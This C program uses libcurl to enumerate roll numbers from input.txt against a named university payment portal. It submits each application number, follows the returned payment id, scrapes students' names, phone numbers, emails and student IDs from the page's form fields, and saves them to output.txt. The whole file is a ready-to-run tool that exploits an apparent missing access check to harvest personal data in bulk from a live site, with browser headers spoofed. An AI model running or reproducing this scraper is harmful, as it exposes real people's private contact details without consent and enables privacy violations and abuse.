#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#define MAX_LINE_LENGTH 10

typedef struct
{
    char *string;
    size_t size;
} Response;

void handle(int status, CURL *curl, char *message)
{
    if (status == 1)
    {
        fprintf(stderr, "%s", message);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        exit(EXIT_FAILURE);
    }
}

size_t callback(void *chunk, size_t size, size_t number_of_chunk, void *location)
{
    size_t real_size = size * number_of_chunk;
    Response *response = (Response *)location;

    response->string = realloc(response->string, response->size + real_size + 1);
    memcpy(&(response->string[response->size]), chunk, real_size);

    response->size += real_size;
    response->string[response->size] = 0;

    return real_size;
}

char *headFetch(char *url, char *id)
{
    CURL *curl;
    CURLcode result;

    Response head;
    head.size = 0;
    head.string = malloc(1);

    curl = curl_easy_init();

    handle(curl == NULL, curl, "Failed to initialize CURL.");
    struct curl_slist *headers = NULL;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, id);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
    curl_easy_setopt(curl, CURLOPT_HEADERDATA, (void *)&head);

    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0");
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
    headers = curl_slist_append(headers, "Origin: https://form.kiit.ac.in");

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    result = curl_easy_perform(curl);

    handle(result != CURLE_OK, curl, "Failed to make CURL request.");

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    curl_global_cleanup();

    return head.string;
}

char *bodyFetch(char url[100])
{
    CURL *curl;
    CURLcode result;

    Response body;
    body.size = 0;
    body.string = malloc(1);

    curl = curl_easy_init();

    handle(curl == NULL, curl, "Failed to initialize CURL.");
    struct curl_slist *headers = NULL;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "amount=1");

    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0");
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
    headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
    headers = curl_slist_append(headers, "Origin: https://form.kiit.ac.in");

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    result = curl_easy_perform(curl);

    handle(result != CURLE_OK, curl, "Failed to make CURL request.");

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    curl_global_cleanup();

    return body.string;
}

void extractValue(const char *html, const char *fieldName, char *result, size_t resultSize)
{
    const char *start = strstr(html, fieldName);
    if (start == NULL)
    {
        fprintf(stderr, "Field not found: %s\n", fieldName);
        return;
    }

    start += strlen(fieldName);
    const char *end = strchr(start, '"');
    if (end == NULL)
    {
        fprintf(stderr, "Closing quote not found for field: %s\n", fieldName);
        return;
    }

    size_t length = end - start;
    if (length >= resultSize)
    {
        fprintf(stderr, "Result buffer too small for field: %s\n", fieldName);
        return;
    }

    strncpy(result, start, length);
    result[length] = '\0';
}

int main(int argc, char **argv)
{

    FILE *inputFile;
    char inputFileName[] = "input.txt";
    char outputFileName[] = "output.txt";
    char line[MAX_LINE_LENGTH];
    size_t lineLength;

    inputFile = fopen(inputFileName, "r");
    if (inputFile == NULL)
    {
        fprintf(stderr, "Error opening input file %s\n", inputFileName);
        fprintf(stderr, "Make %s file with roll numbers.\n", inputFileName);
        return 1;
    }

    while (fgets(line, MAX_LINE_LENGTH, inputFile) != NULL)
    {
        FILE *outputFile = fopen(outputFileName, "a");

        if (outputFile == NULL)
        {
            fprintf(stderr, "Error opening output file %s\n", outputFileName);
            fclose(inputFile);
            return 1;
        }
        char idURL[100] = "https://form.kiit.ac.in/payment/";
        char bodyURL[100] = "https://form.kiit.ac.in/payment/app.php?id=";

        char ROLL[100] = "appno=";
        strcat(ROLL, line);

        printf("\n[@] Fetching header of %s", ROLL);
        fflush(stdout);

        char *header = strstr(headFetch(idURL, ROLL), "id=") + 3;

        printf("\n[+] Fetch done.");
        fflush(stdout);

        char ids[11];
        strncpy(ids, header, sizeof(ids) - 1);
        ids[sizeof(ids) - 1] = '\0';
        strcat(bodyURL, ids);

        printf("\n[@] Fetching html body.");
        fflush(stdout);

        char *html = bodyFetch(bodyURL);

        printf("\n[+] Fetch done.\n\n");
        fflush(stdout);

        char order_id[20];
        char student_id[20];
        char phone[20];
        char email[50];
        char amount[10];
        char roll_no[20];
        char name[50];

        extractValue(html, "student_id\" value=\"", student_id, sizeof(student_id));
        extractValue(html, "phone\" value=\"", phone, sizeof(phone));
        extractValue(html, "email\" value=\"", email, sizeof(email));
        extractValue(html, "roll_no\" value=\"", roll_no, sizeof(roll_no));
        extractValue(html, "name\" value=\"", name, sizeof(name));

        printf("[\033[1;34m+\033[0m] Roll No: %s\n", roll_no);
        printf("[\033[1;34m+\033[0m] Phone: %s\n", phone);
        printf("[\033[1;34m+\033[0m] Name: %s\n", name);
        printf("[\033[1;34m+\033[0m] Email: %s\n", email);
        printf("[\033[1;34m+\033[0m] Student ID: %s\n", student_id);

        fprintf(outputFile, "%s, %s, %s, %s, %s\n", roll_no, student_id, name, email, phone);

        fclose(outputFile);
    }

    fclose(inputFile);
    return 0;
}